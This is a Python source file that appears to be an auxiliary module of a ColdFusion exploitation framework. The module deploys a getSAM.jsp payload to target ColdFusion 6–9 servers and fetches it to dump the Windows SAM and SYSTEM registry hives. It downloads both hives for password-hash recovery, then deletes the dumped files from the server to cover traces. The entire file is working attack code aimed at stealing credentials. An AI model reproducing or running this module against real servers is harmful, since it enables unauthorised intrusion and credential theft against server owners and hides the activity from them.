from src.platform.coldfusion.interfaces import CINTERFACES
from src.platform.coldfusion.authenticate import checkAuth
from log import LOG
from auxiliary import Auxiliary
import deployer
import utility


class Auxiliary:

    def download_file(self, url, fname):
        local_filename = fname
        try:
            response = utility.requests_get(url, stream=True)
            if response.status_code == 200:
                with open(local_filename, 'wb') as hive:
                    for chunk in response.iter_content(chunk_size=1024):
                        if chunk:
                            hive.write(chunk)
                            hive.flush()
                utility.Msg("Successfully saved {0} to local directory".format(fname), LOG.SUCCESS)
                return local_filename
            else:
                utility.Msg("Error downloading {0} (Http code: {1})".format(
                    fname, response.status_code), LOG.ERROR)
        except Exception, e:
            utility.Msg("Problem downloading {0} Exception: {1}".format(
                fname, e), LOG.ERROR)

    def Cleanup(self, fingerengine, fingerprint, sam, sys):
        url = "http://{0}:{1}/CFIDE/getSAM.jsp?del={2}&del2={3}".format(
            fingerengine.options.ip, fingerprint.port, sam, sys)

        try:
            response = utility.requests_get(url)
            if response.status_code == 200:
                utility.Msg("Files cleaned up from server.")
            else:
                utility.Msg("Failed to cleanup (Http code: %d)" % response.status_code, LOG.ERROR)
        except Exception, e:
            utility.Msg("Exception during cleanup: {0}".format(e), LOG.ERROR)
            return

    def __init__(self):
        self.name = 'Obtain Sam and System Registry hives.'
        self.versions = ["6.0", "7.0", "8.0", "9.0"]
        self.show = True
        self.flag = 'cf-sam'

    def check(self, fingerprint):
        if fingerprint.title == CINTERFACES.CFM and \
           fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):

        fingerengine.options.deploy = "./src/lib/getSAM.jsp"
        deployer.run(fingerengine)

        url = "http://{0}:{1}/CFIDE/getSAM.jsp".format(
            fingerengine.options.ip, fingerprint.port)

        try:
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        if response.status_code == 200:
            filenames = response.text.rstrip()
            if len(filenames) != 0:
                samfile = filenames.split('<')[0]
                samfile = str(samfile).translate(None, "\r\n ")
                systemf = filenames.split('>')[1]
                systemf = str(systemf).translate(None, "\r\n ")

                urlsam = "http://{0}:{1}/CFIDE/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, samfile)
                self.download_file(urlsam, "SAM")

                urlsys = "http://{0}:{1}/CFIDE/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, systemf)
                self.download_file(urlsys, "SYSTEM")

                self.Cleanup(fingerengine, fingerprint, samfile, systemf)

            else:
                utility.Msg("Was not running as admin, no file names in response.", LOG.DEBUG)
                self.Cleanup(fingerengine, fingerprint, "samfile", "systemf")

        else:
            utility.Msg("Http error: %d" % response.status_code, LOG.DEBUG)

        fingerengine.options.deploy = None